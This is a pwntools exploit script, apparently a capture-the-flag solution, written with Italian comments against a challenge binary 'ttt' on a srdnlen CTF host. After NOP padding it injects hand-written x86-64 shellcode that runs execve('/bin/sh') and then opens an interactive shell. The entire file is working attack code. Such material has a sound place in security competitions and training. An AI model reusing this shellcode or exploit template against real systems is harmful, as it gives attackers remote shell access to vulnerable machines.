#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './ttt')
lib = CDLL(exe.libc.path)

host = args.HOST or 'ttt.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4012d3
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

print(0x64)

padding = asm("nop") * 100

for i in range(5):
    io.sendlineafter(b": ", padding)
    print(i, io.recvline())


padding = asm("nop") * 50
io.sendlineafter(b"N): ", padding)
# io.sendlineafter(b": ", padding)
print("c", io.recvline())
ret = io.recvline().strip()

padding = b"\x90" * 30 
shell = b"\x48\x00\x00\x00\x00\x00\x00\x00\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x49\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05"
print(shell)
print("Nostro valore: ", ret)
io.sendlineafter(b"N): ", b"y")
io.sendlineafter(b": ", shell)
io.sendlineafter(b"N): ", chr(0x6e).encode())

io.interactive()

